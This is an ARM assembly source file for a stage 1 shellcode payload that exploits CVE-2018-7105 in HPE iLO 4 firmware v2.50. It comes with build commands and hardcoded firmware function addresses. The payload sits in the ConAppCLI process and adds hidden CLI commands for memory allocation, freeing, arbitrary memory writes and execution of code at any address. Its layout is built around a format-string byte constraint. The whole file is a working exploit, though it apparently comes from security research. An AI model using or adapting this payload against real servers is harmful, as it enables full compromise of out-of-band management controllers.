/* Stage 1 payload written in ConAppCLI memory using CVE-2018-7105
 * Only 216 bytes per "segment" are allowed, from 0x28, to prevent 0x25 from
 * being in an address (chr(0x25) = '%')
 *
 * Compile in a standalone fashion using:
    arm-none-eabi-gcc -march=armv5 -c -fPIC -nostdlib -ffreestanding stage1.S -o stage1_ilo4_250.o \
        -DADDR_get_CLI_session_ptr=0x21e24 \
        -DADDR_CLI_printf=0x12f50 \
        -DADDR_libc_malloc=0x17B85E8 \
        -DADDR_libc_free=0x17B86F4
    arm-none-eabi-objcopy -j .shcode -O binary stage1_ilo4_250.o stage1_ilo4_250.bin
 */
.section .shcode, "ax", %progbits
.arm
.align 2
/* Use 256-byte segments, with 26..ff in each segment
 * They are the onlly valid addresses
 * And in fact use 0x28 to keep 4-byte alignment
 */
FIRST_SEGMENT:
    .zero 0x28

_start:
    /* In ARM asm, fp=r11, ip=r12 */
    mov     ip, sp
    push    {r5, r6, r7, r8, r9, r10, fp, ip, lr, pc}
    sub     fp, ip, #4 /* fp = pointer to saved pc */

    mov     r6, r0 /* save arg0 = CLI session ID */
    ldr     r7, [pc, #(get_CLI_session_ptr - . - 8)]
    blx     r7
    mov     r5, r0
    /* From now on, on iLO 4 v2.50:
     * - r4 = Thread-Local structure for glibc
     * - r5 = Pointer to CLI Session info
     *      offset 0x164 = array of 16 arguments, 256 chars each
     *              0x164..263 = CLI command name
     *              0x264..363 = first arg
     *              0x364..464 = second arg
     *              ...
     *              0x1064..1163 = last arg
     *      offset 0x1164 = u32 number of arguments
     * - r6 = ID of CLI Session
     * - r7 = temp register for function address
     */

    /* Decode the integer in args[1][1:] into r8 using base16 with alphabet 'ABCDEFGHIJKLMNOP' */
    mov r8, #0
    add r1, r5, #0x264 /* pointer to 1sr char of first arg, which is skipped */
_addr_loop:
    ldrb r2, [r1, #1]!
    sub r2, r2, #0x41
    cmp r2, #0x10
    lsllo r8, r8, #4
    addlo r8, r8, r2
    blo _addr_loop

    /* Load first char of args[1] */
    ldrb    r0, [r5, #0x264]
    cmp     r0, #0x61 /* a */
    beq     cmd_alloc
    cmp     r0, #0x66 /* f */
    beq     cmd_free
    cmp     r0, #0x77 /* w */
    beq     cmd_write
    cmp     r0, #0x78 /* x */
    beq     cmd_execute

    /* Default command */
    mov     r3, r8
    add     r2, r5, #0x264
    adr     r1, _message
    mov     r0, r6
    ldr     r7, CLI_printf
    blx     r7

return:
    ldmdb   fp, {r5, r6, r7, r8, r9, r10, fp, sp, pc}

cmd_write:
    /* Syntax: wADDR CONTENT
     * Write the memory at the given address
     * regs:
     *   r1 = ptr to arg
     *   r2 = cur char
     *   r3 = cur byte
     *   r8 = destination address
     */
    add r1, r5, #0x364
_cmdw_data_loop:
    ldrb r2, [r1], #1
    sub r2, r2, #0x41
    cmp r2, #0x10
    bhs return /* return if end of data */
    lsl r3, r2, #4

    ldrb r2, [r1], #1
    sub r2, r2, #0x41
    cmp r2, #0x10
    bhs return /* return if end of data */
    add r3, r3, r2

    /* debug */
    push {r0, r1, r2, r3}
    mov r2, r8
    adr r1, _cmdw_addr_fmt
    mov r0, r6
    ldr r7, CLI_printf
    blx r7
    pop {r0, r1, r2, r3}

    strb r3, [r8], #1
    b _cmdw_data_loop

/* new segment */
    .zero 256 - (. - FIRST_SEGMENT)
SECOND_SEGMENT:
    .zero 0x28

cmd_alloc:
    /* Syntax: aSIZE
     * Allocate memory of the given size and prints its address
     * regs:
     *   r7 = malloc
     *   r8 = destination address
     */
    mov r0, r8
    ldr r7, libc_malloc
    blx r7
    /* Show the result, in range 0xea000..0xfa000 */
    mov r2, r0
    adr r1, _cmda_fmt
    mov r0, r6
    ldr r7, CLI_printf
    blx r7
    b return

cmd_free:
    /* Syntax: fADDR
     * Free the memory at the given address
     */
    mov r2, r8
    adr r1, _cmdf_fmt
    mov r0, r6
    ldr r7, CLI_printf
    blx r7
    mov r0, r8
    ldr r7, libc_free
    blx r7
    b return

cmd_execute:
    /* Syntax: xADDR
     * Execute the code at the given address
     */
    mov r1, r5
    mov r0, r6
    blx r8
    b return

/* get_CLI_session_ptr, useful to get arguments */
get_CLI_session_ptr:
    .word ADDR_get_CLI_session_ptr

CLI_printf:
    .word ADDR_CLI_printf

libc_malloc:
    .word ADDR_libc_malloc

libc_free:
    .word ADDR_libc_free

_message:
    .ascii "arg[1]=%.256s, r8=%#x\r\n\0"

_cmdw_addr_fmt:
    .ascii "%#x <- %#x\r\n\0"
    .align 2

_cmda_fmt:
    .ascii "alloc %#x\r\n\0"

_cmdf_fmt:
    .ascii "free %#x\r\n\0"
